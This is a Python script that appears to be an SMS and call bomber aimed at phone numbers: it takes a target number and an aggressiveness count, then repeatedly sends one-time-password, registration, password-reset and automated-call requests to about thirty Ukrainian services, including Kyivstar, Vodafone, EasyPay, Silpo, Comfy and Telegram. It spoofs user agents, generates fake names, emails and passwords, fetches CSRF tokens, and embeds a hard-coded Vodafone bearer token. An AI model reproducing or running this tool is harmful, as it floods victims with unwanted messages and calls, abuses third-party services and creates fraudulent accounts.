import time
import requests
import random
from faker import Faker
from string import digits # циферки
from string import ascii_lowercase as latin # латиница

fake = Faker()

UA = fake.user_agent()

kirill = "абвгдеёжзийклмнопрстуфхцчшщъыьэюя"

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def kyivstar():
    """
    Запрос на логин Киевстар (Kyivstar)  
    """
    url = "https://account.kyivstar.ua/cas/new/api/otp/send?locale=uk"

    headers = {
        "accept-language" : "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,uk;q=0.6",
        "accept-encoding" : "gzip, deflate, br, zstd",
        "accept" : "application/json",
        "User-Agent" : UA
    }

    # payload
    json = {
        "action" : "registration",
        "captcha" : None,
        "login" : raw_number,
        "sid" : "nkw"
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def vodafone():
    """
    Запрос на логин Водафон (Vodafone)
    """

    url = "https://mw-api.vodafone.ua/otp/api/one-time-password/secured"

    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "uk",
        "authorization": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzY29wZSI6WyJ0bWZfbXNfYWN0aXZhdGlvbl9zZXJ2aWNlX3R5cGU6T1JERVItR0lGVCIsInRtZl9tc19jb21tdW5pY2F0aW9uX25vdGlmaWNhdGlvbl90eXBlOk5ld1NhbGVCaWxsIiwidG1mX21zX2N1c3RvbWVyX3Byb2ZpbGU6U0VMRi1DQVJFLUVNQUlMIiwidG1mX21zX2V2ZW50bWFrZXJfcHJvZmlsZV9ldmVudF9yZWFkIiwidG1mX21zX2N1c3RvbWVyX3Byb2ZpbGU6UkVBTC1USU1FLVNDT1JJTkciLCJ0bWZfbXNfaW50ZXJhY3Rpb25fcHJvZmlsZTpTRU5ELUNIQVQtU1VSVkVZIiwidG1mX21zX3Byb2R1Y3RfcHJvZmlsZTpTRFAgY2hhbm5lbDpNWVZPREFGT05FLUFQUCIsInRtZl9tc19hY3RpdmF0aW9uX3NlcnZpY2VfdHlwZTpTRFAtQ1JFQVRFLVNVQlNDUklQVElPTiIsInRtZl9tc19ldmVudG1ha2VyX3Byb2ZpbGVfZXZlbnRfdHlwZV9yZWFkIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOkNIQU5HRS1TRVJWSUNFIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOlRBUklGRi1QTEFOLUNIQU5HRSIsInRtZl9tc19hY3RpdmF0aW9uX3NlcnZpY2VfdHlwZTpERFMtREVBQ1RJVkFUSU9OIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOkREUy1TWU5DLUFDVElWQVRJT04iLCJpdHNmX21zX2Fzc2V0X2NhdGVnb3J5Om15dmYtYXBwIiwidG1mX21zX3Byb2R1Y3RfcHJvZmlsZTpTRFAiLCJ0bWZfbXNfY29tbXVuaWNhdGlvbl9ub3RpZmljYXRpb25fdHlwZTpCYWxhbmNlSGlzdG9yeURldGFpbHMiLCJpdHNmX21zX2Fzc2V0X2NhdGVnb3J5Om15dmZiMmItcmVwb3J0cyIsInRtZl9tc19pbnRlcmFjdGlvbl9wcm9maWxlOlJUTSIsInRtZl9tc19ldmVudG1ha2VyX3Byb2ZpbGVfZXZlbnRfdHlwZV9zdGF0ZV9yZWFkIiwib3BlbmlkIiwidG1mX21zX2ludGVyYWN0aW9uX3Byb2ZpbGU6RFVBIiwidG1mX21zX2V2ZW50bWFrZXJfcHJvZmlsZV9ldmVudF90eXBlX3dyaXRlIiwidG1mX21zX2FjdGl2YXRpb25fc2VydmljZV90eXBlOlNJTS1DSEFOR0UiLCJ0bWZfbXNfYWN0aXZhdGlvbl9zZXJ2aWNlX3R5cGU6U0lNLUNIQU5HRS1CMkIiLCJ0bWZfbXNfYWN0aXZhdGlvbl9zZXJ2aWNlX3R5cGU6RERTLVNZTkMtREVBQ1RJVkFUSU9OIiwiaXRzZl9tc19hc3NldF9jYXRlZ29yeTpteXZmLWFwcC1hdmF0YXIiLCJ0bWZfbXNfYWN0aXZhdGlvbl9zZXJ2aWNlX3R5cGU6U0RQLURFTEVURS1TVUJTQ1JJUFRJT04iLCJ0bWZfbXNfZXZlbnRtYWtlcl9wcm9maWxlX2V2ZW50X3R5cGVfc3RhdGVfd3JpdGUiLCJjaGFubmVsOk1ZVk9EQUZPTkUtV0VCIiwidG1mX21zX3F1YWxpZmljYXRpb25fcHJvZmlsZTpSVE06TVlWT0RBRk9ORS1BUFAiLCJ0bWZfbXNfaW50ZXJhY3Rpb25fcHJvZmlsZTpNWVZGLVNUQVRJU1RJQ1MiXSwiZXhwIjoxNzM1MzE1MzAyLCJhZGRpdGlvbmFsRGV0YWlscyI6eyJQcm9maWxlIjoiTVlWT0RBRk9ORSJ9LCJhdXRob3JpdGllcyI6WyJST0xFX0FOT05ZTU9VUyJdLCJqdGkiOiJlOWVmZjhhMC0wNTliLTQ0NTctOGIzNC0zNDgxM2M4NGEzN2QiLCJ0ZW5hbnQiOiJYTSIsImNsaWVudF9pZCI6IndlYi1teXZvZGFmb25lLW13In0.gcjnA0PstUJR4xaoLiaYsexkQZt_cxYRtamAAeWRFU7GjiuOP3X49X_3BmmsF4JfiecbGyrMfyPNo1Uv18GLKH_GtT10qkQTrpDdmEkMx2RVea1GGoSLNZTkmzRBaQahhC1YXk4nZRobrqtD8ADzywLX_YHVjpmLQyfA7Ws0J3EkWTBt1geSoe_EZk8WO-_y0uk-kDZngJhPLi4N_-WQBN-miguMVMVvMIjY60ZFcBbdXEjUyfh8c5lx7UgqOGFhFK-8rriQapKLml3gmZPnKMTTqbkYBJ3B71EXuSh7OyLYkwCqd6rwS8u4uFrfsp8AAn_e0S0BwCkHf5IgUr6XDg",
        "user-agent": UA,

    }

    json = {
        "langKey" : "uk",
        "receiver": raw_number,
        "receiverTypeKey" : "PHONE-NUMBER",
        "typeKey" : "MYVF-LOGIN-IOS"
    }
    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def easypay_registration():
    """
    Запрос на регистрацию изипей (EasyPay) - easypay.ua
    """
    url = "https://auth.easypay.ua/api/check"

    headers = {
    "Accept": "application/json, text/plain, */*",
    "Accept-Encoding": "gzip, deflate, br, zstd",
    "Accept-Language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,uk;q=0.6",
    "appid" : "ae69291d-d9b1-4cbb-b8e9-a818e45c4945",
    "PartnerKey": "easypay-v2",
    "User-Agent": UA
    }


    json = {
        "phone" : raw_number
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def easypay_reset_password():
    """
    Запрос на восстановление пароля изипей (EasyPay) - easypay.ua
    """
    url = "https://auth.easypay.ua/api/users/account/secret/forgot"

    headers = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,uk;q=0.6",
        "appid" : "ae69291d-d9b1-4cbb-b8e9-a818e45c4945",
        "PartnerKey": "easypay-v2",
        "User-Agent": UA
    }

    json = {
        "channel" : "sms",
        "phone" : raw_number
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def gala_apteka_reset_password():
    """
    Запрос на восстановление пароля Гала Аптека (galafarm) - galafarm.com.ua
    """


    url = "https://galafarm.com.ua/api/resetpwd"

    headers = {
        "accept" : "application/json, text/plain, */*",
        "accept-encoding" : "gzip, deflate, br, zstd",
        "accept-language" : "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,uk;q=0.6",
        "user-agent" : UA
    }

    json = {
        "locale" : "uk",
        "phone" : pretty_number
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def gala_apteka_registration():
    """
    Запрос на регистрацию Гала аптека (galafarm) - galafarm.com.ua
    """

    url = "https://galafarm.com.ua/api/auth/register"

    headers = {
        "accept" : "application/json, text/plain, */*",
        "accept-encoding" : "gzip, deflate, br, zstd",
        "accept-language" : "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,uk;q=0.6",
        "user-agent" : UA
    }

    json = {
        "locale" : "uk",
        "name" : name,
        "surname" : surname,
        "phone" : pretty_number,
        "password" : password,
        "password_confirmation" : password
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def lullaby():
    """
    Запрос на вход/регистрацию лалу...лула..блять лалалалала короче сюдда (Lullaby) - lullaby.ua
    """
    url = "https://api.lullaby.ua/api/phone/code/send"

    headers = {
        "accept" : "application/json, text/plain, */*",
        "accept-encoding" : "gzip, deflate, br, zstd",
        "accept-language" : "uk",
        "user-agent" : UA
    }

    json = {
        "phone" : formatted_number,
        "remember" : True
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def varus():
    """
    Запрос на вход/регистрацию Варус (Varus) - varus.ua
    """
    url = "https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua"

    headers = {
        "accept" : "*/*",
        "accept-encoding" : "gzip, deflate, br, zstd",
        "accept-language" : "ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,uk;q=0.6",
        "user-agent" : UA
    }

    json = {
        "phone" : formatted_number
    }
    
    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def silpo_sms():
    """
    Запрос на вход/регистрацию сильпо (silpo) - silpo.ua
    """
    url = "https://auth.silpo.ua/api/v2/Login/ByPhone"

    headers = {
        "content-type" : "application/json",
    }

    json = {
        "phone" : raw_number,
        "recaptcha" : None,
        "delivery_method" : "sms",
        "phoneChannelType" : 0
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def silpo_viber():
    """
    Запрос на вайбер вход/решистрацию сильпо (silpo) - silpo.ua  
    """
    url = "https://auth.silpo.ua/api/v2/Login/ByPhone"

    headers = {
        "content-type" : "application/json",
    }

    json = {
        "phone" : raw_number,
        "recaptcha" : None,
        "delivery_method" : "viber-sms",
        "phoneChannelType" : 1
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def apteki_ua_register():
    """
    Запрос на регистрацию аптеки юей (apteki ua) - apteki.ua
    """
    url = "https://suitecrm.morion.ua/service/v4_1/rest.php"

    headers = {
        "content-type": "application/x-www-form-urlencoded"
    }

    json = {
        "method" : "sms",
	    "input_type" : "JSON",
	    "response_type": "JSON",
	    "rest_data" : {
		    "phone" : raw_number,
            "app_id" : "apteki",
            "sms" : "registration"
	    }   
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def apteki_ua_reset_password():
    """
    Запрос на восстановление пароля аптеки юей (apteki ua) - apteki.ua
    """
    url = "https://suitecrm.morion.ua/service/v4_1/rest.php"

    headers = {
        "content-type": "application/x-www-form-urlencoded"
    }

    json = {
        "method" : "sms",
	    "input_type" : "JSON",
	    "response_type": "JSON",
	    "rest_data" : {
		    "phone" : raw_number,
            "app_id" : "apteki",
            "sms" : "password"
	    }   
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def comfy():
    """
    Запрос на вход/регистрацию через получение звонка комфи (comfy) - comfy.ua
    """
    url = "https://im.comfy.ua/api/auth/v3/otp/send"

    headers = {
        "content-type" : "application/json"
    }

    json = {
        "phone" : raw_number
    }
    
    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def comfy_ivr():
    """
    Запрос на вход/регистрацию через получение звонка комфи (comfy) - comfy.ua
    """
    url = "https://im.comfy.ua/api/auth/v3/ivr/send"

    headers = {
        "content-type" : "application/json"
    }

    json = {
        "phone" : raw_number
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def pandora():
    """
    Запрос на регистрацию пандора (Pandora) - https://e-pandora.ua/
    """
    url = "https://back.e-pandora.ua/api/auth/register/verification"   

    headers = {
        "content-type": "application/json",
        "x-localization" : "ru",
        "x-requested-with" : "XMLHttpRequest",
        "x-csrftoken" : fake.user_name() # just some random string (просто случайная строка)
    }

    json = {
        "first_name" : kirill_name,
        "phone" : raw_number[2:]
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def pavluks_trans():
    """
    Запрос на регистрацию павлюкс транс (Pavluks Trans) - pavluks-trans.com
    """
    url = "https://admin.pavluks-trans.com/api/auth/v2/register"

    headers = {
        # "cookie" : "connect.sid=s%253AO78lrfrUTzh9xMl5uGntK35hVQon-fcK.zzP21JQsLZjwwm%252B8WSOED7dxsOTah3jSOduZPoZ1JSA",
        "content-type" : "application/json",
        "user-agent" : UA
    }

    json = {
        "email" : email,
        "getNews" : False,
        "name" : name,
        "password" : password,
        "phone" : raw_number
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def coffeemarket():
    """
    Запрос на регистрацию кофи маркет (Coffee Market) - coffeemarket.dp.ua
    """
    url = "https://www.coffeemarket.dp.ua/index.php?route=account/register"

    headers = {
        "content-type" : "application/x-www-form-urlencoded; charset=UTF-8"
    }

    data = {
        "telephone" : pretty_number,
        "password" : password,
        "agree" : "on"
    }

    response = requests.post(
        url=url,
        headers=headers,
        data=data,
        
    )
    if response.status_code == 200:
        return True
    return False

def telegram():
    url = "https://my.telegram.org/auth/send_password"

    headers = {
        
        "Content-type" : "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent" : UA,
    }

    data = {
        "phone" : formatted_number
    }

    response = requests.post(
        url=url,
        headers=headers,
        data=data
    )
    if response.status_code == 200:
            return True
    return False

def green_forest():
    """
    Запрос на регистрацию+восстановление пароля грин форест (Green Forest) - greenforest.com.ua
    """
    try:
        url = "https://greenforest.com.ua/ru/courses/registration"

        headers = {
            "Content-Type": "application/x-www-form-urlencoded"
        }

        data = {
            "utm_data" : "",
            "name" : name,
            "phone" : formatted_number,
            "city_id" : 6,
            "accept_rules" : 1,
            "phone2" : raw_number
        }

        response = requests.post(
            url=url,
            headers=headers,
            data=data
        )
    except: pass
    try:
        url = "https://my-backend.greenforest.com.ua/api/v2/verification-code"

        headers = {
            "Content-Type" : "application/json"
        }

        json = {
            "phone" : formatted_number
        }

        requests.post(
            url=url,
            headers=headers,
            json=json
        )
    except:pass
    if response.status_code == 200:
        return True
    return False

def citrus():
    """
    Запрос на регистрацию+восстановление пароля цитрус (Citrus) - ctrs.com.ua
    """
    try:
        url = "https://my.ctrs.com.ua/api/v2/signup"

        headers = {
            "Content-Type": "application/json"
        }

        json = {
        "phone" : formatted_number,
        "email" : email,
        "name" : name
        }   

        response = requests.post(
            url=url,
            headers=headers,
            json=json
        )
    except: pass
    try:
        url = "https://my.ctrs.com.ua/api/auth/login"

        headers = {
            "Content-Type": "application/json"
        }

        json = {
            "identity" : formatted_number
        }

        response = requests.post(
            url=url,
            headers=headers,
            json=json
        )
    except: pass
    if response.status_code == 200:
        return True
    return False

def multiplex():
    url = "https://auth2.multiplex.ua/login"

    headers = {
        "Content-Type": "application/json"
    }
    json = {
        "login" : raw_number
    }
    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def estro_register():
    session = requests.Session()

    token_response = session.get("https://estro.ua/api/state/csrf-token")

    token = token_response.json()["data"]["value"]

    url = "https://estro.ua/api/auth/code/send/for-new"

    headers = {
        "content-type" : "application/json",
        "x-csrf-token": token
    }

    json = {
        "phone_number" : pretty_number
    }

    response = session.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def estro_reset_password():
    session = requests.Session()

    token_response = session.get("https://estro.ua/api/state/csrf-token")

    token = token_response.json()["data"]["value"]

    url = "https://estro.ua/api/auth/code/send/for-existed"

    headers = {
        "content-type" : "application/json",
        "x-csrf-token": token
    }

    json = {
        "phone_number" : pretty_number
    }

    response = session.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def good_toys_register():
    """
    Запрос на регистрацю гуд тойс (Good Toys) - goodtoys.com.ua
    """
    url = "https://goodtoys.com.ua/auth/send/sms/"

    headers = {
        "content-type" : "application/x-www-form-urlencoded"
    }

    data = {
        "type" : "reg",
        "phone" : pretty_number,
        "captcha" : ""
    }

    response = requests.post(
        url=url,
        headers=headers,
        data=data
    )
    if response.status_code == 200:
        return True
    return False

def good_toys_reset_password():
    """
    Запрос на восстановление пароля гуд тойс (Good Toys) - goodtoys.com.ua
    """
    url = "https://goodtoys.com.ua/auth/send/sms/"

    headers = {
        "content-type" : "application/x-www-form-urlencoded"
    }

    data = {
        "type" : "auth",
        "phone" : pretty_number,
        "captcha" : ""
    }

    response = requests.post(
        url=url,
        headers=headers,
        data=data
    )
    if response.status_code == 200:
        return True
    return False

def vchehle_register():
    """
    Запрос на регистрацию вчехле (VChehle) - vchehle.ua
    """
    url = "https://vchehle.ua/register"

    headers = {
        "content-type":"application/json"
    }

    json = {
        "email" : formatted_number,
        "password" : password,
        "password_confirmation" : password
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def vchehle_reset_password():
    """
    Запрос на восттановления пароля вчехле (VChehle) - vchehle.ua
    """
    url = "https://vchehle.ua/forgot"

    headers = {
        "content-type":"application/json"
    }

    json = {
        "email" : formatted_number,
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def kabanchik_register():
    url = "https://kabanchik.ua/api/v3/registration/verify_phone/performer"

    headers = {
        "Content-Type" : "application/json",
        "user-agent" : UA
    }

    json = {
        "agreement" : True,
        "email" : email,
        "first_name" : name,
        "is_company" : False,
        "phone" : pretty_number.replace(" ", ""),
        "region_id" : 1,
        "social" : None
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def kabanchik_reset_password():
    url = "https://kabanchik.ua/api/v3/auth/forgot_password/"

    headers = {
        "Content-Type" : "application/json",
        "user-agent" : UA
    }

    json = {
        "phone_email" : raw_number
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

def fashion_ivr():
    url = "https://md-fashion.ua/auth/sign-up-send-call"

    headers = {
        "content-type":"application/json",
        "user-agent" : UA,
    }

    json = {
        "phone" : formatted_number
    }

    response = requests.post(
        url=url,
        headers=headers,
        json=json
    )
    if response.status_code == 200:
        return True
    return False

# def alphasms():
#     session = requests.Session()

#     captcha_response = session.get("https://alphasms.ua/uk/", headers={"user-agent":UA})

#     captcha = captcha_response.json()
#     print(captcha)

#     url = "https://alphasms.ua/ajax/register/"

#     headers = {
#         "content-type":"application/json"
#     }

#     json = {
#         "captcha" : captcha,
#         "code":None,
#         "company":fake.user_name(),
#         "email" : email,
#         "name": name,
#         "password": password,
#         "phone":str("+" + raw_number[:3] + " (" + raw_number[3:5] + ") " + raw_number[5:8] + "-" + raw_number[8:10] + "-" + raw_number[10:12]).replace(" ", "") ,
#         "referer":"https://alphasms.ua/uk/",
#         "remember":True,
#         "uri":"/panel/sign-up/"
#     }

#     response = session.post(
#         url=url,
#         headers=headers,
#         json=json
#     )

#     print(response.status_code)
#     print(response.text)

def main():
    global raw_number
    raw_number = input("Вводи вот так XXXXXXXXXXXX\n")
    global formatted_number # XXXXXXXXXXXX
    formatted_number = str("+" + raw_number) # +XXXXXXXXXXXX
    global pretty_number
    pretty_number = str("+" + raw_number[:2] + " (" + raw_number[2:5] + ") " + raw_number[5:8] + "-" + raw_number[8:10] + "-" + raw_number[10:12]) # +XX (XXX) XXX-XX-XX
    global password
    password = fake.password()
    faker_name = fake.name().split(" ")
    global name 
    name = faker_name[0]
    global surname
    surname = faker_name[1]
    global kirill_name
    kirill_name = "".join(random.choice(kirill) for _ in range(10))
    global email
    email = fake.email()
                                                            # global username
                                                            # username = fake.user_name()
    for i in range(input("Введи степень агрессивности")):

        for func in [kyivstar,
                    vodafone,
                    easypay_registration,
                    easypay_reset_password,
                    gala_apteka_registration,
                    gala_apteka_reset_password,
                    lullaby,
                    varus,
                    silpo_sms,
                    silpo_viber,
                    apteki_ua_register,
                    apteki_ua_reset_password,
                    comfy,
                    comfy_ivr,
                    pandora,
                    pavluks_trans,
                    coffeemarket,
                    telegram,
                    green_forest,
                    citrus,
                    multiplex,
                    estro_register,
                    estro_reset_password,
                    good_toys_register,
                    good_toys_reset_password,
                    vchehle_register,
                    vchehle_reset_password,
                    kabanchik_register,
                    kabanchik_reset_password,
                    fashion_ivr,
                    ]:
            
            
        
            try:
                if func():
                    print(bcolors.OKGREEN + f"[+] {func.__name__}")
                else:
                    print(bcolors.FAIL + f"[-] {func.__name__}")
            except: pass

    
    
    
    

   

if __name__ == "__main__":
    main()
